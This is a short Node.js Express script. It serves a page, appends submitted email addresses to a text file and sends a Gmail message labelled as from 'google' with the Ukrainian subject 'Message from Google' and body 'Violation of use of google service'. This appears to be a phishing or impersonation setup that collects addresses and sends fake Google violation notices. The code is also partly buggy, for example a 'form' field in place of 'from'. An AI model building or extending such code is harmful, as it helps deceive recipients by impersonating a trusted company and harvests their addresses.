const nodemailer = require('nodemailer');
const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const opn = require('opn');

const app = express('express');
const PORT = 3000;
app.use(bodyParser.urlencoded({ extended: true }));


app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
})


app.listen(PORT, () => {
    console.log(`Server work on port: ${PORT}`);

})
app.post('/saveEmail', (req, res) => {
    const email = req.body.email; 
  
    fs.appendFile('emails.txt', email + '\n', (err) => {
      if (err) throw err;
      console.log('Email saved to emails.txt');
    });
  
  });
  

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.LOGIN,
        pass: process.env.PASSWORD
    }
})

const mailOptions = {
    form: 'google',
    to: 'gikew57286@othao.com',
    subject: 'Повідомлення від Google',
    text: 'Порушення використання сервісу google'
};


transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
        console.log(error);
    } else {
        console.log(`Email sent: ${info.response}`);
    }

})